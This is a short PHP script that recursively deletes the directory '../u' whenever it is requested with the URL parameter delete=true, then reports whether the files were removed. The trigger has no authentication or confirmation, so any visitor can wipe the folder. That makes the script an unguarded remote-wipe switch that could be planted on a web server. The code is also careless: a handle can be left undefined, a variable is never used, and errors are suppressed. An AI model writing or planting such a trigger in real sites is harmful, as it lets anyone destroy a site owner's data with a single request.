<?php
function delete_directory($dirname) {
         if (is_dir($dirname))
           $dir_handle = opendir($dirname);
  if (!$dir_handle)
       return false;
  while($file = readdir($dir_handle)) {
        if ($file != "." && $file != "..") {
             if (!is_dir($dirname."/".$file))
                  unlink($dirname."/".$file);
             else
                  delete_directory($dirname.'/'.$file);
        }
  }
  closedir($dir_handle);
  rmdir($dirname);
  return true;
}
$val='';
if($_GET["delete"] <> ""){
	$val = $_GET["delete"];
}
else{
	$val = '';
}
if($val == "true"){
	$pathInPieces = explode('/', $_SERVER['DOCUMENT_ROOT']);
	
	@$del = delete_directory('../u');
	
	if($del==true)
	{
		echo "file are successfully deleted";
	}
	else
	{
		echo "folder already deleted";
	}
}

?>